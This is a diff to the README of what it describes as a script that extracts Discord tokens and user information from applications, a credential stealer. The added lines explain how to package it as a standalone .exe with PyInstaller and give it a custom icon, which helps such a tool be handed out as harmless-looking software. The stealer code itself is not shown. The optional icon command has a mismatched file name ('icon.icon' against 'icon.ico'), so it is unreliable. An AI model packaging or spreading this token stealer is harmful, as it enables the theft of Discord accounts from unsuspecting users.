@@ -22,4 +22,16 @@ This script extracts Discord tokens and user information from various applicatio
 1. Clone or download the script to your local machine.
 2. Install the required Python packages by running the script, which will automatically install missing dependencies:
    ```bash
-   python script.py
+   python main.py
+
+## Convertion into a .exe
+
+Run the following command to convert the script to a .exe file
+```bash
+python -m PyInstaller --onefile main.py
+```
+
+(Optional) To add a custom icon to the executable, use that command and replace icon.ico with your icon
+```bash
+python -m PyInstaller --onefile --icon=icon.icon main.py
+```
